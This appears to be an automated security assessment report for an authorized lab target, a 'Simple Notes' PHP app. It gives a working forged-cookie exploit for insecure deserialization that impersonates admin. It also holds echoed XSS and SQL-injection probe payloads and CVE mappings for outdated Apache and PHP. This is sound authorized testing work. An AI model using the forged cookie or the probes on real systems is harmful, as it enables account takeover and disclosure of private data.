# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — session Account impersonation via forgeable PHP-serialized identity cookie ("data") — insecure deserialization](#finding-1)
    - [2. HIGH — vulnerable-component Outdated Apache httpd 2.4.38 (Debian) — known CVE-2019-0211 local root privilege escalation (+ later SSRF/smuggling CVEs)](#finding-2)
    - [3. MEDIUM — vulnerable-component End-of-life PHP 7.1.33 — unsupported since 2019-12-01, multiple unpatched post-EOL CVEs](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqz4zez5-p1ozj6` |
| Target | http://target.local:32873/ |
| Started | 2026-06-29T11:30:38.084Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 12 mapped · 12 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32873`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 critical, 1 high, 1 medium

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [session] Account impersonation via forgeable PHP-serialized identity cookie ("data") — insecure deserialization

- Screen: `s-0004`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32873/

Identity is carried in a client-side cookie `data` = base64(PHP serialize(UserProfile)), e.g. `O:11:"UserProfile":2:{s:6:"userid";i:N;s:8:"username";s:..:"..";}`. The cookie is NOT HttpOnly and has NO integrity protection (no HMAC/signature), so it is fully attacker-forgeable, and the value is unserialize()'d server-side (insecure deserialization). The server trusts the deserialized `userid` to load that user's notes and echoes `username` directly. Forging `data` for `userid=1, username=admin` (with no valid PHPSESSID) logs an unauthenticated attacker in as another user and discloses their private notes — here admin's "Flag / My Secret Flag". Any account is reachable by changing the userid integer. This is the exact forgeable-cookie condition flagged by session analysis (not HttpOnly + tamper-able value); the negative control (garbage value) yields an empty unauthenticated profile, proving the forged value is what grants access.

**Reproduction**

```
1) analyze_session: cookie `data` = base64 of `O:11:"UserProfile":2:{s:6:"userid";i:<id>;s:8:"username";s:<len>:"<name>";}`, HttpOnly=false, no signature.
2) Forge: base64 of `O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:5:"admin";}` = `TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7fQ==`.
3) GET /index.php with `Cookie: data=<forged>; PHPSESSID=` (no credentials, no valid session).
4) Result: 200 "Welcome admin" + user 1's private notes "Flag / My Secret Flag", "ToDo". Stable across replays (ev-...-28, ev-...-29; bodyLength 2450).
5) Negative control: same request with `data=bm90LXZhbGlk...` (invalid serialized value) → "Welcome " empty, no notes (ev-...-27; bodyLength 1528). Increment the userid to impersonate/enumerate any user.
```

**Evidence**

- Evidence `ev-mqz5rzzh-27` — `artifacts/s-0004/ev-mqz5rzzh-27/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 1528
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 11:52:51 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.38 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
    <head>
      <title>Simple Notes</title>
      <link rel="stylesheet" href="static/styles.css">
      <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    </head>
    <body>
        &nbsp;</br>
        <div class="center blue">
                        <table>
                <tr>
                    <td width="90%"><h1>Welcome </h1></td>
                    <td text-align="right"><a class="button" href="logout.php">Logout</a></td>
                </tr>
            </table>
        </div>
                &nbsp;</br>
        <div class="center blue">
            <form method="post" action="/index.php">
                <table width="100%">
                    <tr>
                        <td colspan="2"><h3>Add Note</h3></td>
                    </tr>
                    <tr>
                        <td text-align="right" align="right">Title:</td>
                        <td><input type="text" name="title" style="width: 95%;" required></td>
                    </tr>
                    <tr>
                        <td valign="top" text-align="right" align="right">Content:</td>
                        <td><textarea name="content" rows="10" cols="30" style="width: 95%;" required></textarea></td>
                    </tr>
                    <tr>
                        <td colspan="2" align="right"><input class="button" type="submit" value="Add">&nbsp;&nbsp;</td>
                    </tr>
                </table>
            </form>
        </div>
    </body>
</html>
```

- Evidence `ev-mqz5s1jm-28` — `artifacts/s-0004/ev-mqz5s1jm-28/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 2450
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 11:52:53 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.38 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
    <head>
      <title>Simple Notes</title>
      <link rel="stylesheet" href="static/styles.css">
      <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    </head>
    <body>
        &nbsp;</br>
        <div class="center blue">
                        <table>
                <tr>
                    <td width="90%"><h1>Welcome admin</h1></td>
                    <td text-align="right"><a class="button" href="logout.php">Logout</a></td>
                </tr>
            </table>
        </div>
                                &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>Flag</h3></td>
                            </tr>
                            <tr>
                                <td><p>My Secret Flag </p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>ToDo</h3></td>
                            </tr>
                            <tr>
                                <td><p>Test web app security.</p></td>
                            </tr>
                        </table>
                        </div>
                            &nbsp;</br>
        <div class="center blue">
            <form method="post" action="/index.php">
                <table width="100%">
                    <tr>
                        <td colspan="2"><h3>Add Note</h3></td>
                    </tr>
                    <tr>
                        <td text-align="right" align="right">Title:</td>
                        <td><input type="text" name="title" style="width: 95%;" required></td>
                    </tr>
                    <tr>
                        <td valign="top" text-align="right" align="right">Content:</td>
                        <td><textarea name="content" rows="10" cols="30" style="width: 95%;" required></textarea></td>
                    </tr>
                    <tr>
                        <td colspan="2" align="right"><input class="button" type="submit" value="Add">&nbsp;&nbsp;</td>
                    </tr>
                </table>
            </form>
        </div>
    </body>
</html>
```

- Evidence `ev-mqz5sf4n-29` — `artifacts/s-0004/ev-mqz5sf4n-29/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 2450
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 11:53:11 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.38 (Debian)
set-cookie: <redacted>
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
    <head>
      <title>Simple Notes</title>
      <link rel="stylesheet" href="static/styles.css">
      <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    </head>
    <body>
        &nbsp;</br>
        <div class="center blue">
                        <table>
                <tr>
                    <td width="90%"><h1>Welcome admin</h1></td>
                    <td text-align="right"><a class="button" href="logout.php">Logout</a></td>
                </tr>
            </table>
        </div>
                                &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>Flag</h3></td>
                            </tr>
                            <tr>
                                <td><p>My Secret Flag </p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>ToDo</h3></td>
                            </tr>
                            <tr>
                                <td><p>Test web app security.</p></td>
                            </tr>
                        </table>
                        </div>
                            &nbsp;</br>
        <div class="center blue">
            <form method="post" action="/index.php">
                <table width="100%">
                    <tr>
                        <td colspan="2"><h3>Add Note</h3></td>
                    </tr>
                    <tr>
                        <td text-align="right" align="right">Title:</td>
                        <td><input type="text" name="title" style="width: 95%;" required></td>
                    </tr>
                    <tr>
                        <td valign="top" text-align="right" align="right">Content:</td>
                        <td><textarea name="content" rows="10" cols="30" style="width: 95%;" required></textarea></td>
                    </tr>
                    <tr>
                        <td colspan="2" align="right"><input class="button" type="submit" value="Add">&nbsp;&nbsp;</td>
                    </tr>
                </table>
            </form>
        </div>
    </body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.38 (Debian) — known CVE-2019-0211 local root privilege escalation (+ later SSRF/smuggling CVEs)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32873/

The server runs Apache httpd 2.4.38 (Debian), released Jan 2019. This is a VERSION-BASED finding: the version was read from the `Server: Apache/2.4.38 (Debian)` response header (and echoed verbatim in the default 404 page address line — `Apache/2.4.38 (Debian) Server at target.local Port 32873`), NOT exploited. Operator should verify against the actual loaded modules/config before relying on it.

Known issues affecting 2.4.38 (all fixed in 2.4.39+, so this build is missing them):
- CVE-2019-0211 — mod_prefork/scoreboard local privilege escalation: code executing in a less-privileged child (e.g. a PHP/CGI script — and this host serves PHP) can manipulate shared memory to gain the privileges of the parent process (root) on the next graceful restart. CVSS 7.8 / High. This is the headline risk for 2.4.38 on a PHP host and would chain with any code-exec foothold.
- CVE-2019-0215 — mod_ssl TLS 1.3 client-cert access-control bypass.
- CVE-2019-0217 — mod_auth_digest access-control bypass / race.
- CVE-2019-0220 — URL normalization inconsistency (multiple consecutive slashes) enabling access-control bypass.

Additionally, 2.4.38 is far below the fix line for several later high/critical issues that apply if the relevant modules are enabled (config-dependent, not confirmed here): CVE-2021-40438 (mod_proxy SSRF, CVSS 9.0, fixed 2.4.49), CVE-2022-22720 (HTTP request smuggling, fixed 2.4.53), CVE-2023-25690 (mod_proxy request smuggling, fixed 2.4.56). NOTE: CVE-2021-41773/42013 (path-traversal RCE) affect ONLY 2.4.49/2.4.50 and do NOT apply to 2.4.38.

Remediation: upgrade to a current Apache 2.4.6x package and suppress the version banner (ServerTokens Prod / ServerSignature Off).

**Reproduction**

```
1. GET http://target.local:32873/ and inspect response headers → `Server: Apache/2.4.38 (Debian)` (ev-mqz72xst-5j, 200/27470 bytes). 2. Reproduced identically on /index.php (ev-mqz72yer-5k, 200/27470 bytes). 3. Negative control: GET /verdict-nonexistent-path-404-check returns a 404 (ev-mqz7301p-5m, 404/279 bytes) — distinguishable by status and length; its address line also discloses Apache/2.4.38. Map version 2.4.38 to the CVEs above (all fixed in 2.4.39+).
```

**Evidence**

- Evidence `ev-mqz7301p-5m` — `artifacts/_/ev-mqz7301p-5m/`

Request:

```http
GET /verdict-nonexistent-path-404-check HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 404
connection: Keep-Alive
content-length: 279
content-type: text/html; charset=iso-8859-1
date: Mon, 29 Jun 2026 12:29:24 GMT
keep-alive: timeout=5, max=97
server: Apache/2.4.38 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.38 (Debian) Server at target.local Port 32873</address>
</body></html>
```

- Evidence `ev-mqz72xst-5j` — `artifacts/_/ev-mqz72xst-5j/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response (truncated):

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 27470
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 12:29:21 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
    <head>
      <title>Simple Notes</title>
      <link rel="stylesheet" href="static/styles.css">
      <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    </head>
    <body>
        &nbsp;</br>
        <div class="center blue">
                        <table>
                <tr>
                    <td width="90%"><h1>Welcome test</h1></td>
                    <td text-align="right"><a class="button" href="logout.php">Logout</a></td>
                </tr>
            </table>
        </div>
                                &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-testfile</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-content-marker</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5ngu6676vsafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5ngu6676v\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>Zmark9h3</h3></td>
                            </tr>
                            <tr>
                                <td><p>&lt;img src=x onerror=alert(1)&gt;Zmark9body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe2</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5pnlnesg7safe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe2</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5pnlnesg7\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz5pw4hjk7lsafe</h3></td>
                            </tr>
                            <tr>
                                <td><p>titlexsstest</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5pw4hjk7l\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>titlexsstest</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>sqltest\'&quot;</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqltestbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xsstitle</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5wu4ogxiusafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xsstitle</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5wu4ogxiu\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz5xl18ahhgsafe</h3></td>
                            </tr>
                            <tr>
                                <td><p>xssbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5xl18ahhg\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>xssbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictsqli\'</h3></td>
                            </tr>
                            <tr>
                                <td><p>probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-sx</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz60yqs3hdzsafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-sx</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz60yqs3hdz\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz62ee74q67safe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-title-sink</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz62ee74q67\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-title-sink</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test-body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test-body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictSQLbase</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqlbaseline</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictSQL\'&quot;`--</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqlquote</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
```

- Evidence `ev-mqz72yer-5k` — `artifacts/_/ev-mqz72yer-5k/`

Request:

```http
GET /index.php HTTP/1.1
Host: target.local:32873
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response (truncated):

```http
HTTP/1.1 200
cache-control: no-store, no-cache, must-revalidate
connection: Keep-Alive
content-length: 27470
content-type: text/html; charset=UTF-8
date: Mon, 29 Jun 2026 12:29:22 GMT
expires: Thu, 19 Nov 1981 08:52:00 GMT
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.38 (Debian)
vary: Accept-Encoding
x-powered-by: PHP/7.1.33

<!doctype html>
<html>
    <head>
      <title>Simple Notes</title>
      <link rel="stylesheet" href="static/styles.css">
      <link rel="icon" href="static/favicon.ico" type="image/x-icon">
    </head>
    <body>
        &nbsp;</br>
        <div class="center blue">
                        <table>
                <tr>
                    <td width="90%"><h1>Welcome test</h1></td>
                    <td text-align="right"><a class="button" href="logout.php">Logout</a></td>
                </tr>
            </table>
        </div>
                                &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-testfile</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-content-marker</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5ngu6676vsafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5ngu6676v\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>Zmark9h3</h3></td>
                            </tr>
                            <tr>
                                <td><p>&lt;img src=x onerror=alert(1)&gt;Zmark9body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe2</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5pnlnesg7safe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xss-probe2</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5pnlnesg7\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz5pw4hjk7lsafe</h3></td>
                            </tr>
                            <tr>
                                <td><p>titlexsstest</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5pw4hjk7l\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>titlexsstest</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>sqltest\'&quot;</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqltestbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xsstitle</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz5wu4ogxiusafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>xsstitle</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5wu4ogxiu\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz5xl18ahhgsafe</h3></td>
                            </tr>
                            <tr>
                                <td><p>xssbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz5xl18ahhg\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>xssbody</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictsqli\'</h3></td>
                            </tr>
                            <tr>
                                <td><p>probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-probe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-probe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-sx</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdictstoXmqz60yqs3hdzsafe</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdict-sx</h3></td>
                            </tr>
                            <tr>
                                <td><p>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz60yqs3hdz\'&quot;&gt;</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictstoXmqz62ee74q67safe</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-title-sink</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>&quot;&gt;&lt;img src=x onerror=&quot;window.__verdict_xss=\'stoXmqz62ee74q67\'&quot;&gt;</h3></td>
                            </tr>
                            <tr>
                                <td><p>verdict-title-sink</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test-body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>csrf-test</h3></td>
                            </tr>
                            <tr>
                                <td><p>csrf-test-body</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
                        <div class="center blue">
                        <table>
                            <tr>
                                <td><h3>verdictSQLbase</h3></td>
                            </tr>
                            <tr>
                                <td><p>sqlbaseline</p></td>
                            </tr>
                        </table>
                        </div>
                                            &nbsp;</br>
